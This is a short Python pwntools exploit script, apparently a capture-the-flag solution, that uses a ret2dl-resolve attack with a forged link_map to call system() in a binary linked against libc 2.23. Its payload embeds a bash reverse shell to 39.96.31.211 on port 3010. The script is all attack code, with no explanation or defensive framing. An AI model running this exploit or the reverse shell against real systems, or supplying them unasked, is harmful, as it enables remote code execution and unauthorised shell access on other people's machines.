from pwn import*
from RET2DL64 import*

p = process('./main')
p = remote('39.96.31.211',3005)
context.log_level ='DEBUG'
elf = ELF('./main')
libc =ELF('./libc-2.23.so',checksec=False)
fake = elf.sym['data'] + 0x100
reloc_index = 1
one_got = elf.got['__libc_start_main']
offset  = libc.sym['system'] - libc.sym['__libc_start_main']
#---------------------
payload  = p64(0x10000000000000000-(0x600BC0-0x600B40))
payload += p64(fake) #the link_map will be change into (data+0x100)
payload += 'bash -c "bash -i >& /dev/tcp/39.96.31.211/3010 0>&1"\x00'
payload=payload.ljust(0x100,'\x00')
#---------------------
link_map = build(fake,one_got,reloc_index,offset)
payload += link_map
payload = payload.ljust(0x400,'\x00')
#--------------------
p.send(payload)
p.interactive()
